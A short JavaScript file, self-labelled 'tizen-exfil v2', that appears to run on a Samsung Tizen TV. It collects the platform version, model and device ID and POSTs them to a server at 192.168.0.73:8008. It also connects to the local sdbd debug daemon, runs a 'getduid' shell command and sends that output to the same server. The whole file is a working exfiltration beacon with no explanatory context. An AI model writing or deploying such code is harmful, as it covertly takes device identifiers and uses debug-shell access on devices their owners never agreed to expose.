// tizen-exfil v2 - beacon immediately
var beaconData = {source: 'tizen-exfil-v2', ts: new Date().toISOString()};
try { beaconData.platform = tizen.systeminfo.getCapability('http://tizen.org/feature/platform.version'); } catch(e) { beaconData.platform_err = e.message; }
try { beaconData.model = tizen.systeminfo.getCapability('http://tizen.org/feature/model'); } catch(e) {}
try { beaconData.duid = tizen.systeminfo.getCapability('http://tizen.org/feature/device.id'); } catch(e) {}

var fetchFn;
try { fetchFn = require('node-fetch'); } catch(e) { fetchFn = global.fetch; }

// Beacon NOW
fetchFn('http://192.168.0.73:8008/tv-results', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(beaconData)
}).then(function(r){ return r.text(); })
 .then(function(t){ console.log('BEACON OK: ' + t); })
 .catch(function(e){ console.log('BEACON FAIL: ' + e.message); });

// Collect sdbd data async
try {
    var adbhost = require('adbhost');
    var client = adbhost.createConnection({ host: '127.0.0.1', port: 26101 });
    client._stream.on('connect', function() {
        beaconData.sdbd = 'connected';
        var s = client.createStream('shell:0 getduid');
        var out = '';
        s.on('data', function(c) { out += c.toString(); });
        s.on('end', function() {
            beaconData.getduid = out.trim();
            fetchFn('http://192.168.0.73:8008/tv-results', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(beaconData)
            }).then(function(r){return r.text();}).catch(function(){});
            try { client._stream.end(); } catch(e2) {}
        });
    });
    client._stream.on('error', function(e) { beaconData.sdbd_error = e.message; });
} catch(e) {
    beaconData.sdbd_error = e.message;
}
